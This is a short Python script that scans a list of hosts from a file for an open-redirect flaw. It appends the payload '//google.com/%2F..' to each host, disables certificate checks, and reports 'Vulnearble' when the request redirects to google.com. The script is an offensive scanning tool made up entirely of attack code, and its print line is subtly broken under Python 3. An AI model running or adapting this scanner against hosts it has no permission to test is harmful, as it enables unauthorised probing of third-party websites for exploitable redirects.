import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning


def operate(url,line):
	try:
		r = requests.get(url,verify=False, allow_redirects=True,timeout=3)
		requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
		resurl=r.url
		if "https://google.com/" in resurl:
			print ("Vulnearble - " + line).strip()
		else:
			pass
	except:
		pass



def main():
	threads = []
	payload="//google.com/%2F..".strip()		
	file = open("min.txt","r")
	for line in file:
		url = "http://"+line.strip()
		final_url=url+payload
		operate(final_url,line)
main()
